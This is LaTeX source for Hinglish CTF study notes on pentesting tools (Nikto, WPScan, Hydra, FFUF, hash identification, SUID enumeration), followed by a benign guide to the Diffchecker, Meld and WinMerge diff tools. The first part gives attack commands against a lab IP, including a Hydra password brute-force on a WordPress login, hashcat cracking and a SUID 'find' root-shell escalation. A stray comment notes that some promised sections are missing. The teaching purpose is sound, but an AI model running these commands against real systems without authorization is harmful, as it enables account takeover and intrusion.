    morecomment=[l]{\#},
    morestring=[b]{"}
}


\newtcolorbox{examplebox}{
    colback=mylightgreen!10,        % Light green background
    colframe=mygreen,               % Green frame
    title=Example,                  % Default title
    fonttitle=\bfseries\color{white}, % Bold white title
    colbacktitle=myblue,            % Blue title background
    arc=0mm,                        % Square corners
    boxrule=1pt,                    % Border thickness
    breakable                       % Allow box to break across pages
}

% Custom bullet points with color
\newcommand{\coloredbullet}{\textcolor{myred}{\textbullet}}



% Title Page
\begin{titlepage}
    \centering
    \vspace*{3cm}
    {\Huge\bfseries\color{myblue}Mostly used tools in ctf \par}
    \vspace{1cm}
    {\large Date: March 12, 2025\par}
    \vfill
\end{titlepage}


\hrulefill



\subsection{1. Nikto - Yeh Kya Karta Hai?}
\textbf{Notes Mein Likh:}
\begin{itemize}
    \item \textbf{\color{myblue}Kya Hai}: Nikto ek web server scanner hai jo websites aur web servers mein vulnerabilities (kamzoriyan) dhoondta hai.
    \item \textbf{\color{myblue}Kya Check Karta Hai}: Yeh outdated software versions, dangerous files (jaise \texttt{\color{mygreen}/admin}), misconfigurations (galat settings), aur known vulnerabilities dhoondta hai.
    \item \textbf{\color{myblue}Kyun Use Karte Hain}: Yeh enumeration (information gathering) ke liye hai. Web server ke baare mein basic info deta hai jo attack ke liye useful ho sakta hai.
    \item \textbf{\color{myblue}Kab Use Karna}: Jab tujhe ek web server (jaise Apache, Nginx) mila hai aur tu check karna chahta hai ki usme koi obvious weakness hai ya nahi.
    \item \textbf{\color{myblue}Kahan Use Hota Hai}: CTF mein jab web-based challenge ho (jaise flag website pe chhupa ho), aur real pentesting mein bhi jab initial recon (reconnaissance) kar rahe ho.
\end{itemize}

\textbf{Real Pentesting Mein Use Hota Hai?}: Haan bhai, Nikto real pentesting mein bahut use hota hai, kyunki yeh fast hai aur web servers ki basic security check karta hai. Lekin yeh loud hai (logs mein dikhta hai), toh stealth pentesting mein carefully use karna padta hai.

\textbf{Example Kaise Use Karna:}
\begin{itemize}
    \item Maan le tujhe CTF mein ek IP diya gaya: \texttt{\color{mygreen}10.10.10.10}, aur port 80 pe web server chal raha hai.
    \item Command:  
    \begin{lstlisting}[language=Bash]
nikto -h http://10.10.10.10
    \end{lstlisting}
    \item \textbf{\color{myblue}Output}: Yeh batayega ki server ka version kya hai (jaise Apache 2.4.7), koi outdated hai kya, ya koi dangerous file (jaise \texttt{\color{mygreen}/config.php}) expose ho raha hai.
    \item \textbf{\color{myblue}CTF Mein}: Agar output mein \texttt{\color{mygreen}/admin} ya \texttt{\color{mygreen}/backup} dikha, toh tu browser mein check kar sakta hai—shayad flag wahi ho!
\end{itemize}

\hrulefill

\subsection{2. WPScan - Yeh Kya Hai?}
\textbf{Notes Mein Likh:}
\begin{itemize}
    \item \textbf{\color{myblue}Kya Hai}: WPScan ek WordPress vulnerability scanner hai.
    \item \textbf{\color{myblue}Kya Check Karta Hai}: Yeh WordPress websites pe kaam karta hai—core version, plugins, themes mein known vulnerabilities dhoondta hai, aur users ko enumerate (list) bhi kar sakta hai.
    \item \textbf{\color{myblue}Kyun Use Karte Hain}: Agar target website WordPress pe bani hai, toh isse uski kamzoriyan mil jaati hain.
    \item \textbf{\color{myblue}Kab Use Karna}: Jab CTF mein ya pentesting mein ek website dikhe aur tu confirm kar le ki yeh WordPress pe chal rahi hai (jaise \texttt{\color{mygreen}/wp-login.php} ya \texttt{\color{mygreen}/wp-content} dikhe).
    \item \textbf{\color{myblue}Kahan Use Hota Hai}: CTF ke web challenges mein jab WordPress involved ho, aur real pentesting mein WordPress sites ke audit ke liye.
\end{itemize}

\textbf{Real Pentesting Mein Use Hota Hai?}: Haan, bahut zyada! WordPress duniya mein sabse common CMS (Content Management System) hai, aur aksar misconfigured ya outdated hota hai, toh pentester isse use karte hain.

\textbf{Example Kaise Use Karna:}
\begin{itemize}
    \item Maan le target hai: \texttt{\color{mygreen}http://10.10.10.10}.
    \item Command:  
    \begin{lstlisting}[language=Bash]
wpscan --url http://10.10.10.10 --enumerate u
    \end{lstlisting}
    \item \textbf{\color{myblue}Output}: Yeh users ki list dega (jaise \texttt{\color{mygreen}admin}, \texttt{\color{mygreen}user1}). Agar tu \texttt{\color{mygreen}--enumerate ap} add karega, toh vulnerable plugins bhi dikhayega.
    \item \textbf{\color{myblue}CTF Mein}: Agar user \texttt{\color{mygreen}admin} mila aur password weak hai (jaise \texttt{\color{mygreen}admin123}), toh tu login try kar sakta hai aur flag mil sakta hai!
\end{itemize}

\hrulefill

\subsection{3. Hydra vs FFUF - Kab Kaunsa Use Karna?}
\textbf{Notes Mein Likh:}

\textbf{Hydra:}
\begin{itemize}
    \item \textbf{\color{myblue}Kya Hai}: Ek password brute-force tool hai jo login pages ya services (jaise SSH, HTTP) pe username/password guess karta hai.
    \item \textbf{\color{myblue}Kyun Use Karte Hain}: Jab tujhe login credentials crack karne hon (jaise username/password combo).
    \item \textbf{\color{myblue}Kab Use Karna}: Jab tujhe ek login page mila (jaise \texttt{\color{mygreen}/wp-login.php} ya SSH port 22) aur tu credentials guess karna chahta hai.
    \item \textbf{\color{myblue}Kahan Use Hota Hai}: CTF mein jab flag login ke peeche chhupa ho, aur real pentesting mein weak passwords dhoondne ke liye.
\end{itemize}

\textbf{FFUF:}
\begin{itemize}
    \item \textbf{\color{myblue}Kya Hai}: Ek fast fuzzing tool hai jo directories, files, ya parameters brute-force karta hai.
    \item \textbf{\color{myblue}Kyun Use Karte Hain}: Web server pe hidden files ya directories (jaise \texttt{\color{mygreen}/secret}, \texttt{\color{mygreen}/flag.txt}) dhoondne ke liye.
    \item \textbf{\color{myblue}Kab Use Karna}: Jab tujhe web server ki structure explore karni ho, na ki login crack karna ho.
    \item \textbf{\color{myblue}Kahan Use Hota Hai}: CTF mein web enumeration ke liye, aur real pentesting mein content discovery ke liye.
\end{itemize}

\textbf{Real Pentesting Mein Use Hota Hai?}: Dono hi use hote hain! Hydra loud hota hai (server pe bahut requests bhejta hai), toh stealth ke liye kam use hota hai, lekin FFUF pentesting mein bahut common hai hidden content dhoondne ke liye.

\textbf{Example:}
\begin{itemize}
    \item \textbf{\color{myblue}Hydra}:  
    \begin{itemize}
        \item Target: \texttt{\color{mygreen}http://10.10.10.10/wp-login.php}.
        \item Command:  
        \begin{lstlisting}[language=Bash]
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid"
        \end{lstlisting}
        \item \textbf{\color{myblue}Output}: Agar password mil gaya (jaise \texttt{\color{mygreen}password123}), toh tu login kar sakta hai.
    \end{itemize}
    \item \textbf{\color{myblue}FFUF}:  
    \begin{itemize}
        \item Target: \texttt{\color{mygreen}http://10.10.10.10}.
        \item Command:  
        \begin{lstlisting}[language=Bash]
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.10/FUZZ
        \end{lstlisting}
        \item \textbf{\color{myblue}Output}: Yeh \texttt{\color{mygreen}/admin}, \texttt{\color{mygreen}/flag.txt} jaise paths dikhayega agar exist karte hain.
    \end{itemize}
\end{itemize}

\textbf{Kab Kaunsa?}: 
\begin{itemize}
    \item Hydra jab login crack karna ho.
    \item FFUF jab directories ya files dhoondne hon.
\end{itemize}

\hrulefill

\subsection{4. Hash Type Identify Karne Wala Tool}
\textbf{Notes Mein Likh:}
\begin{itemize}
    \item \textbf{\color{myblue}Kya Hai}: Hash type jaan ne ke liye tools hote hain jo hashed string dekhke batate hain ki yeh MD5, SHA1, ya kuch aur hai.
    \item \textbf{\color{myblue}Kali Mein Tool}: \texttt{\color{mygreen}hash-identifier} ya \texttt{\color{mygreen}hashcat} (identify mode) use kar sakte hain.
    \item \textbf{\color{myblue}Kyun Use Karte Hain}: CTF mein hashed passwords milte hain, aur unko crack karne se pehle type jaan na zaroori hai.
    \item \textbf{\color{myblue}Kab Use Karna}: Jab tujhe ek hash mila (jaise \texttt{\color{mygreen}5f4dcc3b5aa765d61d8327deb882cf99}) aur tu nahi jaanta yeh kis type ka hai.
    \item \textbf{\color{myblue}Kahan Use Hota Hai}: CTF ke crypto challenges mein, aur real pentesting mein stolen hashes ko analyze karne ke liye.
\end{itemize}

\textbf{Real Pentesting Mein Use Hota Hai?}: Haan, jab pentester ko database se hashed passwords milte hain, toh type jaan ke crack karte hain.

\textbf{Example Kaise Use Karna:}
\begin{itemize}
    \item Command:  
    \begin{lstlisting}[language=Bash]
hash-identifier
    \end{lstlisting}
    \item Input: \texttt{\color{mygreen}5f4dcc3b5aa765d61d8327deb882cf99} paste karo.
    \item \textbf{\color{myblue}Output}: Yeh bolega "Possible Hash: MD5".
    \item \textbf{\color{myblue}CTF Mein}: Agar MD5 confirm hua, toh \texttt{\color{mygreen}hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt} se crack kar sakta hai.
\end{itemize}

\hrulefill

\subsection{5. Linux Command: \texttt{\color{mygreen}find / -perm -u=s -type f 2>/dev/null}}
\textbf{Notes Mein Likh:}
\begin{itemize}
    \item \textbf{\color{myblue}Kya Hai}: Yeh command Linux system pe SUID (Set User ID) bit set wale binaries (executable files) dhoondti hai.
    \item \textbf{\color{myblue}Breakdown}:  
    \begin{itemize}
        \item \texttt{\color{mygreen}find /}: Puri filesystem mein search karta hai.
        \item \texttt{\color{mygreen}-perm -u=s}: SUID bit check karta hai (jo root ke permissions deta hai).
        \item \texttt{\color{mygreen}-type f}: Sirf files dhoondta hai (directories nahi).
        \item \texttt{\color{mygreen}2>/dev/null}: Error messages (jaise "Permission denied") chhupata hai.
    \end{itemize}
    \item \textbf{\color{myblue}Kyun Use Karte Hain}: SUID binaries root ke saath chal sakte hain, aur agar inme vulnerability hai, toh privilege escalation (normal user se root ban na) ke liye use ho sakte hain.
    \item \textbf{\color{myblue}Kab Use Karna}: Jab tujhe CTF mein ya pentesting mein low-privilege shell mila hai aur tu root access chahta hai.
    \item \textbf{\color{myblue}Kahan Use Hota Hai}: CTF ke Linux-based challenges mein, aur real pentesting mein Linux servers pe privilege escalation ke liye.
\end{itemize}

\textbf{Real Pentesting Mein Use Hota Hai?}: Haan bhai, yeh ek standard technique hai Linux systems pe privilege escalation ke liye.

\textbf{Example Kaise Use Karna:}
\begin{itemize}
    \item Command:  
    \begin{lstlisting}[language=Bash]
find / -perm -u=s -type f 2>/dev/null
    \end{lstlisting}
    \item \textbf{\color{myblue}Output}: List milegi jaise:  
    \begin{lstlisting}[language=Bash]
/bin/su
/usr/bin/passwd
/usr/bin/find
    \end{lstlisting}
    \item \textbf{\color{myblue}CTF Mein}: Agar \texttt{\color{mygreen}/usr/bin/find} mila, toh tu yeh kar sakta hai:  
    \begin{lstlisting}[language=Bash]
find . -exec /bin/sh \; -quit
    \end{lstlisting}
    \item Yeh root shell dega kyunki \texttt{\color{mygreen}find} SUID hai aur root ke saath chalta hai.
\end{itemize}

\textbf{Kyun Zaroori}: Yeh command vulnerable binaries dhoondne mein madad karti hai jo system compromise kar sakte hain.

\hrulefill

% Note: The original content ends abruptly after the SUID command explanation,
% missing the promised "Real Pentesting Mein Use" section for Burp Suite and Nmap,
% and the "Summary" section partially. I’ve included everything up to that point as provided,
% and added the remaining parts as they appear in your input without adding anything beyond it.

\textbf{Real Pentesting Mein Use}: Dono tools real-world mein heavily used hote hain—Burp web pentesting ke liye, Nmap network recon ke liye.

\hrulefill

\subsection{Summary}
\begin{itemize}
    \item \textbf{\color{myblue}Nikto}: Web server vulnerabilities ke liye, recon ke time use karo.
    \item \textbf{\color{myblue}WPScan}: WordPress sites ke liye, jab WordPress dikhe.
    \item \textbf{\color{myblue}Hydra}: Login cracking ke liye, jab credentials chahiye.
    \item \textbf{\color{myblue}FFUF}: Hidden files/directories dhoondne ke liye, web enumeration mein.
    \item \textbf{\color{myblue}Hash Identifier}: Hash type jaan ne ke liye, crypto challenges mein.
    \item \textbf{\color{myblue}SUID Command}: Privilege escalation ke liye, Linux system mein.
    \item \textbf{\color{myblue}Extra Tools}: Burp Suite (web), Nmap (network).
\end{itemize}

\textbf{CTF vs Real Pentesting}:
\begin{itemize}
    \item CTF mein yeh tools fast results ke liye use hote hain, kyunki time kam hota hai.
    \item Real pentesting mein bhi yeh sab kaam aate hain, lekin stealth, reporting, aur legal scope ke saath carefully use hote hain.
\end{itemize}

\hrulefill

===============================
\hrule


\definecolor{myblue}{RGB}{0,102,204}      % Blue for headings
\definecolor{mygreen}{RGB}{0,153,76}      % Green for examples
\definecolor{myred}{RGB}{204,0,0}         % Red for emphasis
\definecolor{mylightblue}{RGB}{173,216,230} % Light blue for code blocks
\definecolor{mylightgreen}{RGB}{144,238,144} % Light green for table rows
\definecolor{myorange}{RGB}{255,165,0}    % Orange for subheadings
\definecolor{mypurple}{RGB}{128,0,128}    % Purple for sub-subheadings

\titleformat{\section}{\Large\bfseries\color{myblue}}{\thesection}{1em}{}
\titleformat{\subsection}{\large\bfseries\color{myorange}}{\thesubsection}{1em}{}
\titleformat{\subsubsection}{\normalsize\bfseries\color{mypurple}}{\thesubsubsection}{1em}{}


\lstset{
    backgroundcolor=\color{mylightblue}, % Light blue background
    basicstyle=\ttfamily\footnotesize, % Smaller font size
    frame=single,                   % Framed border
    breaklines=true,                % Allow line breaks
    breakatwhitespace=true,         % Break at whitespace
    breakindent=0pt,                % No indent after break
    keywordstyle=\color{myblue},    % Keywords in blue
    commentstyle=\color{gray},      % Comments in gray
    stringstyle=\color{mypurple},   % Strings in purple
    showspaces=false,               % No space markers
    showstringspaces=false,         % No string space markers
    tabsize=4,                      % Tab size
    xleftmargin=0.5cm,              % Left margin for code
    xrightmargin=0.5cm              % Right margin for code
}

% Define Bash language for listings
\lstdefinelanguage{Bash}{
    morekeywords={sudo,apt,install},
    morecomment=[l]{\#},
    morestring=[b]{"}
}

\newtcolorbox{examplebox}{
    colback=mylightgreen!10,        % Light green background
    colframe=mygreen,               % Green frame
    title=Example,                  % Default title
    fonttitle=\bfseries\color{white}, % Bold white title
    colbacktitle=myblue,            % Blue title background
    arc=0mm,                        % Square corners
    boxrule=1pt,                    % Border thickness
    breakable                       % Allow box to break across pages
}



% Title Page
\begin{titlepage}
    \centering
    \vspace*{3cm}
    {\Huge\bfseries\color{myblue} Diffchecker ek text and image compare , Meld aur WinMerge Tool\par}
    \vspace{1cm}
    {\large Date: March 12, 2025\par}
    \vfill
\end{titlepage}

\section{Diffchecker Kya Hai?}
\textbf{Diffchecker} ek online tool hai jo do text, code files, ya images ko compare karne ke liye use hota hai. Ye tool dikhata hai ki dono versions me kya difference hai, kaunse lines add hui hain, delete hui hain ya modify ki gayi hain.

\subsection{Diffchecker Coding Me Kaise Use Hota Hai?}
\begin{enumerate}
    \item \textbf{\color{myblue}Code Compare Karna:} Jab aap kisi project me changes karte ho aur purani version se naya version compare karna chahte ho, to Diffchecker ka use kar sakte ho.  
    \begin{itemize}
        \item \textbullet\ \textbf{Example:} Tumne ek function likha jo pehle slow chal raha tha, aur tumne kuch optimize kiya. Ab tum Diffchecker me dono versions paste karke dekh sakte ho ki kya changes hue hain.
    \end{itemize}
    \item \textbf{\color{myblue}Bug Finding:} Agar koi bug introduce ho gaya hai aur tumhe samajh nahi aa raha ki kaunsa line change hone se bug aaya, to Diffchecker use karke asani se changes track kar sakte ho.
    \item \textbf{\color{myblue}Merge Conflict Resolve Karna:} Agar tum Git me kaam kar rahe ho aur kisi aur developer ke changes ke saath tumhare changes merge ho rahe hain, to Diffchecker help kar sakta hai changes dekhne me.
\end{enumerate}

\subsection{CTF (Capture The Flag) Me Diffchecker Ka Use}
CTF competitions me diffchecker ka use kaafi hota hai, especially \textbf{steganography, cryptography aur reverse engineering} challenges me.

\begin{enumerate}
    \item \textbf{\color{myblue}Encoded / Obfuscated Text Compare Karna:} Kabhi kabhi encrypted ya base64 encoded strings ke thode se variations diye jaate hain. Diffchecker use karke minor differences check kar sakte ho.
    \item \textbf{\color{myblue}Steganography Challenges:} Kabhi kabhi ek image ke do versions diye jaate hain jisme chhoti changes hoti hain jo flag chhupa sakti hain. Diffchecker image comparison use karke pata laga sakta hai.  
    \begin{itemize}
        \item \textbullet\ \textbf{Example:} Agar ek CTF challenge me do text files di hain aur bola gaya hai ki flag find karo, to tum dono ko Diffchecker me daal kar dekho. Agar kisi ek file me ek hidden line hai jo dusri file me nahi hai, to wahi flag ho sakta hai.
    \end{itemize}
\end{enumerate}

\subsection{Diffchecker Kaise Use Kare? (Step-by-Step Guide)}

\begin{enumerate}
    \item \textbf{\color{myblue}Step 1: Diffchecker Website Open Karein}  
    \begin{itemize}
        \item Browser me jaake \href{https://www.diffchecker.com/}{Diffchecker} website open karein.
    \end{itemize}
    \item \textbf{\color{myblue}Step 2: Text Compare Karna}  
    \begin{itemize}
        \item Agar text compare karna hai, to "Text" tab par click karein.
        \item Left box me pehla text ya code paste karein.
        \item Right box me dusra text ya code paste karein.
        \item "Find Difference" button par click karein.
        \item Tool differences highlight karega, jaise added lines (green), deleted lines (red), aur modified lines (yellow).
        \item \textbullet\ \textbf{Example:}  
        \begin{lstlisting}
Pehla Text:
Hello World!
This is a test.

Dusra Text:
Hello World!
This is a new test.
        \end{lstlisting}
        Diffchecker dikhayega ki "This is a test." ko "This is a new test." me modify kiya gaya hai.
    \end{itemize}
    \item \textbf{\color{myblue}Step 3: File Compare Karna}  
    \begin{itemize}
        \item Agar file compare karna hai, to "File" tab par click karein.
        \item "Upload" button use karke dono files upload karein.
        \item Tool automatically differences highlight karega.
        \item \textbullet\ \textbf{Example:}  
        \begin{itemize}
            \item Pehla file: \texttt{old\_code.py}
            \item Dusra file: \texttt{new\_code.py}
            \item Diffchecker dikhayega ki kya lines add, delete ya modify ki gayi hain.
        \end{itemize}
    \end{itemize}
    \item \textbf{\color{myblue}Step 4: Image Compare Karna}  
    \begin{itemize}
        \item Agar image compare karna hai, to "Image" tab par click karein.
        \item Dono images upload karein.
        \item Tool differences highlight karega, jaise koi pixel change hua hai ya koi hidden message hai.
        \item \textbullet\ \textbf{Example:}  
        \begin{itemize}
            \item Pehli image: \texttt{image1.png}
            \item Dusri image: \texttt{image2.png}
            \item Diffchecker dikhayega ki kya differences hain dono images me.
        \end{itemize}
    \end{itemize}
    \item \textbf{\color{myblue}Step 5: Results Dekhna}  
    \begin{itemize}
        \item Tool differences ko side-by-side ya line-by-line dikhayega.
        \item Added lines green me, deleted lines red me, aur modified lines yellow me highlight honge.
    \end{itemize}
\end{enumerate}

\subsection{Alternative Tools}
\begin{enumerate}
    \item \textbf{\color{myblue}Meld} (Linux, Windows) – GUI-based file comparison tool
    \item \textbf{\color{myblue}WinMerge} (Windows) – Open-source aur powerful diff tool
\end{enumerate}

\subsection{Tips for Using Diffchecker}
\begin{itemize}
    \item Agar text ya code bahut bada hai, to "Ignore Whitespace" option use karein.
    \item Agar images me chhote differences dhundh rahe ho, to zoom feature use karein.
    \item Diffchecker ka pro version offline use aur advanced features provide karta hai.
\end{itemize}

\subsection{Conclusion}
Diffchecker ek simple aur powerful tool hai jo coding, CTF challenges, aur daily tasks me help karta hai. Iska use karke aap easily differences find kar sakte ho aur apna time save kar sakte ho.

\hrulefill

\section{Meld aur WinMerge Ka Use Kaise Kare? (Step-by-Step Guide)}

\subsection{1. Meld (Linux, Windows) – GUI-Based File Comparison Tool}
Meld ek graphical tool hai jo do ya zyada files ya directories ko compare karne me help karta hai. Ye tool developers aur system administrators ke liye kaafi useful hai, kyunki ye changes ko visually highlight karta hai.

\subsubsection{Meld Kaise Use Kare?}

\textbf{Step 1: Meld Install Karein}  
\begin{itemize}
    \item \textbf{\color{myblue}Linux (Ubuntu/Debian):}  
    Terminal me ye command run karein:  
    \begin{lstlisting}[language=Bash]
sudo apt install meld
    \end{lstlisting}
    \item \textbf{\color{myblue}Windows:}  
    Meld ki official website se installer download karein: \href{https://meldmerge.org/}{Meld Website}
\end{itemize}

\textbf{Step 2: Meld Open Karein}  
\begin{itemize}
    \item Meld ko open karein. Home screen par aapko options dikhenge jaise:  
    \begin{itemize}
        \item \textbf{File Comparison}
        \item \textbf{Directory Comparison}
        \item \textbf{Version Control View}
    \end{itemize}
\end{itemize}

\textbf{Step 3: File Comparison Karein}  
\begin{itemize}
    \item "File Comparison" option par click karein.
    \item Left side me pehli file aur right side me dusri file select karein.
    \item "Compare" button par click karein.
    \item Meld dono files ko side-by-side dikhayega aur differences ko highlight karega:  
    \begin{itemize}
        \item Added lines green me.
        \item Deleted lines red me.
        \item Modified lines blue me.
    \end{itemize}
\end{itemize}

\textbf{Step 4: Directory Comparison Karein}  
\begin{itemize}
    \item "Directory Comparison" option par click karein.
    \item Dono directories select karein.
    \item Meld dikhayega ki kaunsi files add, delete ya modify ki gayi hain.
    \item Aap directly files ko edit bhi kar sakte hain Meld me.
\end{itemize}

\textbf{Step 5: Changes Merge Karein}  
\begin{itemize}
    \item Agar aap changes ko merge karna chahte hain, to Meld me "Copy Left" ya "Copy Right" buttons ka use karein.
    \item Ye buttons aapko changes ko ek file se dusri file me copy karne me help karenge.
\end{itemize}

\textbf{Example:}  
\begin{itemize}
    \item Pehli file: \texttt{old\_code.py}
    \item Dusri file: \texttt{new\_code.py}
    \item Meld dikhayega ki kya lines add, delete ya modify ki gayi hain.
\end{itemize}

\subsection{2. WinMerge (Windows) – Open-Source aur Powerful Diff Tool}
WinMerge ek open-source tool hai jo files aur directories ko compare aur merge karne me help karta hai. Ye tool kaafi lightweight aur user-friendly hai.

\subsubsection{WinMerge Kaise Use Kare?}

\textbf{Step 1: WinMerge Install Karein}  
\begin{itemize}
    \item WinMerge ki official website se installer download karein: \href{https://winmerge.org/}{WinMerge Website}
    \item Installer run karein aur steps follow karein.
\end{itemize}

\textbf{Step 2: WinMerge Open Karein}  
\begin{itemize}
    \item WinMerge ko open karein. Home screen par aapko options dikhenge jaise:  
    \begin{itemize}
        \item \textbf{File Comparison}
        \item \textbf{Folder Comparison}
    \end{itemize}
\end{itemize}

\textbf{Step 3: File Comparison Karein}  
\begin{itemize}
    \item "File" menu me jaake "Open" par click karein.
    \item Left side me pehli file aur right side me dusri file select karein.
    \item "Compare" button par click karein.
    \item WinMerge dono files ko side-by-side dikhayega aur differences ko highlight karega:  
    \begin{itemize}
        \item Added lines green me.
        \item Deleted lines red me.
        \item Modified lines yellow me.
    \end{itemize}
\end{itemize}

\textbf{Step 4: Folder Comparison Karein}  
\begin{itemize}
    \item "Folder" menu me jaake "Open" par click karein.
    \item Dono folders select karein.
    \item WinMerge dikhayega ki kaunsi files add, delete ya modify ki gayi hain.
    \item Aap directly files ko edit bhi kar sakte hain WinMerge me.
\end{itemize}

\textbf{Step 5: Changes Merge Karein}  
\begin{itemize}
    \item Agar aap changes ko merge karna chahte hain, to WinMerge me "Copy to Right" ya "Copy to Left" buttons ka use karein.
    \item Ye buttons aapko changes ko ek file se dusri file me copy karne me help karenge.
\end{itemize}

\textbf{Example:}  
\begin{itemize}
    \item Pehli file: \texttt{old\_code.py}
    \item Dusra file: \texttt{new\_code.py}
    \item WinMerge dikhayega ki kya lines add, delete ya modify ki gayi hain.
\end{itemize}

\subsection{Meld vs WinMerge: Kaunsa Tool Use Kare?}
\begin{itemize}
    \item \textbf{\color{myblue}Meld:}  
    \begin{itemize}
        \item Linux aur Windows dono ke liye available hai.
        \item GUI-based aur user-friendly hai.
        \item Version control systems (jaise Git) ke saath integrate ho sakta hai.
        \item Best hai agar aapko visually changes dekhna hai aur merge karna hai.
    \end{itemize}
    \item \textbf{\color{myblue}WinMerge:}  
    \begin{itemize}
        \item Sirf Windows ke liye available hai.
        \item Lightweight aur fast hai.
        \item Best hai agar aapko files aur folders ko quickly compare karna hai.
    \end{itemize}
\end{itemize}

\subsection{Conclusion}
\begin{itemize}
    \item \textbf{\color{myblue}Meld} aur \textbf{\color{myblue}WinMerge} dono hi powerful tools hain jo aapko files aur directories ko compare aur merge karne me help karte hain.
    \item Agar aap Linux user hain to Meld use karein, aur agar Windows user hain to WinMerge use karein.
    \item Dono tools kaafi easy hain aur aapko coding, debugging aur file management me kaafi help karenge.
\end{itemize}

\hrulefill

===============================
\hrule


\end{document}
